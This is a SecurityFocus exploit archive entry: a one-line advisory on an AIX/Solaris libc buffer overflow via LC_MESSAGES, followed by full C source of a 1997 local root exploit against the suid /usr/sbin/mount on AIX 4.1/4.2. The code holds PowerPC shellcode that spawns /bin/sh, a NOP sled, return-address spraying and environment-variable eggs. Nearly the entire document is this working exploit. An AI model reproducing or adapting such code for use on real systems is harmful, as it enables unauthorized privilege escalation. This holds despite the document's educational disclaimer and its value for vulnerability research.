// source: https://www.securityfocus.com/bid/268/info

A buffer overflow in libc's handling of the LC_MESSAGES environment variable allows a malicious user to exploit any suid root program linked agains libc to obtain root privileges. This problem is found in both IBM's AIX and Sun Microsystem's Solaris. This vulnerability allows local users to gain root privileges.

/*
 AIX 4.2/4.1 LC_MESSEGAS /usr/sbin/mount exploit by Georgi Guninski

----------------------------------------
DISCLAIMER

 This program is for educational purpose ONLY. Do not use it without
permission.
 The usual standard disclaimer applies, especially the fact that Georgi
Guninski
 is not liable for any damages caused by direct or  indirect use of
 the information or functionality provided by this program.
 Georgi Guninski, his employer or any Internet provider bears NO
responsibility for content
 or misuse of this program or any derivatives thereof.
 By using this program you accept the fact that any damage (dataloss,
system
 crash, system compromise, etc.) caused by the use of this program is
not
 Georgi Guninski's responsibility.

In case you distribute this, please keep the disclaimer and my
addresses.
-----------------------------------------
Use the IBM C compiler.
Compile with: cc -g test2.c
-----------------
Georgi Guninski
 guninski@hotmail.com
 sgg@vmei.acad.bg
 guninski@linux2.vmei.acad.bg
 http://www.geocities.com/ResearchTriangle/1711



Suggestions,comments and job offers are welcome!


22-Mar-97
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char prog[100]="/usr/sbin/mount";
char prog2[30]="mount";
extern int execv();

char *createvar(char *name,char *value)
{
char *c;
int l;
l=strlen(name)+strlen(value)+4;
if (! (c=malloc(l))) {perror("error allocating");exit(2);};
strcpy(c,name);
strcat(c,"=");
strcat(c,value);
putenv(c);
return c;
}

/*The program*/
main(int argc,char **argv,char **env)
{
/*The code*/
unsigned int code[]={
0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,
0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,
0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,
0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
0x7c0903a6 , 0x4e800420, 0x0
};
/* disassembly
7c0802a6        mfspr   r0,LR
9421fbb0        stu     SP,-1104(SP) --get stack
90010458        st      r0,1112(SP)
3c60f019        cau     r3,r0,0xf019 --CTR
60632c48        lis     r3,r3,11336  --CTR
90610440        st      r3,1088(SP)
3c60d002        cau     r3,r0,0xd002 --TOC
60634c0c        lis     r3,r3,19468  --TOC
90610444        st      r3,1092(SP)
3c602f62        cau     r3,r0,0x2f62 --'/bin/sh\x01'
6063696e        lis     r3,r3,26990
90610438        st      r3,1080(SP)
3c602f73        cau     r3,r0,0x2f73
60636801        lis     r3,r3,26625
3863ffff        addi    r3,r3,-1
9061043c        st      r3,1084(SP) --terminate with 0
30610438        lis     r3,SP,1080
7c842278        xor     r4,r4,r4    --argv=NULL
80410440        lwz     RTOC,1088(SP)
80010444        lwz     r0,1092(SP) --jump
7c0903a6        mtspr   CTR,r0
4e800420        bctr              --jump
*/

#define MAXBUF 600
unsigned int buf[MAXBUF];
unsigned int frame[MAXBUF];
unsigned int i,nop,mn;
int max;
int QUIET=0;
int dobuf=0;
char VAR[30]="LC_MESSAGES";
unsigned int toc;
unsigned int eco;
unsigned int *pt;
char *t;
int egg=1;
int ch;
unsigned int reta; /* return address */
int corr=4604;
char *args[4];
char *newenv[8];
int justframes=1;
int startwith=0;

mn=78;
max=100;

if (argc>1)
        corr = atoi(argv[1]);

pt=(unsigned *) &execv;
toc=*(pt+1);
eco=*pt;

if ( ((mn+strlen((char*)&code)/4)>max) || (max>MAXBUF) )
{
        perror("Bad parameters");
        exit(1);
}

#define OO 7
*((unsigned short *)code + OO + 2)=(unsigned short) (toc & 0x0000ffff);
*((unsigned short *)code + OO)=(unsigned short) ((toc >> 16) &
0x0000ffff);
*((unsigned short *)code + OO + 8 )=(unsigned short) (eco & 0x0000ffff);
*((unsigned short *)code + OO + 6 )=(unsigned short) ((eco >> 16) &
0x0000ffff);

reta=startwith ? (unsigned) &buf[mn]+corr : (unsigned)&buf[0]+corr;

for(nop=0;nop<mn;nop++)
 buf[nop]=startwith ? reta : 0x4ffffb82;        /*NOP*/
strcpy((char*)&buf[nop],(char*)&code);
i=nop+strlen( (char*) &code)/4-1;

if( !(reta & 0xff) || !(reta && 0xff00) || !(reta && 0xff0000)
        || !(reta && 0xff000000))
{
perror("Return address has zero");exit(5);
}

while(i++<max)
 buf[i]=reta;
buf[i]=0;

for(i=0;i<max-1;i++)
 frame[i]=reta;
frame[i]=0;

if(QUIET) {puts((char*)&buf);fflush(stdout);exit(0);};

puts("Start...");/*Here we go*/

newenv[0]=createvar("EGGSHEL",(char*)&buf[0]);
newenv[1]=createvar("EGGSHE2",(char*)&buf[0]);
newenv[2]=createvar("EGGSHE3",(char*)&buf[0]);
newenv[3]=createvar("EGGSHE4",(char*)&buf[0]);
newenv[4]=createvar("DISPLAY",getenv("DISPLAY"));
newenv[5]=VAR[0] ? createvar(VAR,justframes ? (char*)&frame :
(char*)&buf):NULL;
newenv[6]=NULL;

args[0]=prog2;
execve(prog,args,newenv);
perror("Error executing execve \n");
/*      Georgi Guninski
        guninski@hotmail.com
        sgg@vmei.acad.bg
        guninski@linux2.vmei.acad.bg
        http://www.geocities.com/ResearchTriangle/1711
*/
}